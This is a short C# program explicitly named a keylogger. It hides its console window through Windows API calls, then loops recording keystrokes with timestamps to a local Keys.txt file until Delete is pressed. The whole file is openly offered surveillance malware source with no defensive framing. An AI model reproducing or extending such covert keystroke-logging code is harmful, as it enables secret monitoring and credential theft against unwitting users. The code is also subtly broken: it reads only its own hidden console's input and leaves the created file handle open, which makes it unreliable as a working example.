using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLoggerCSharp
{
    class Program
    {
        //Hides console
        static int SW_SHOW = 5;
        static int SW_HIDE = 0;
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        static void Main(string[] args)
        {
            IntPtr myWindow = GetConsoleWindow();
            ShowWindow(myWindow, SW_HIDE);

            string path = "Keys.txt";
            bool isWorking = true;
            while(isWorking == true)
            {
                //Sleeping for while, this will reduce load on cpu
                //Thread.Sleep(10);
                ConsoleKeyInfo text = Console.ReadKey();

                //Check if file exist and if doesn`t exist creates a new one
                if (!File.Exists(path))
                {
                    File.Create(path);
                }
                else if (File.Exists(path))
                {
                    using (var tw = new StreamWriter(path, true))
                    {
                        //Writes the input to the text file
                        tw.WriteLine("Key: {0} || Time: {1}",text.Key,DateTime.Now);

                        //If you want to stop the logger press the Delete button
                        if (text.Key == ConsoleKey.Delete)
                        {
                            isWorking = false;
                            //Indicated the logger has stopped
                            MessageBox.Show("KeyLogger stopped");
                            tw.WriteLine("Keylogger stopped");
                            tw.WriteLine(string.Concat(Enumerable.Repeat("=", 40)));                        
                        }
                    }
                }
            }
        }
        
    }
}
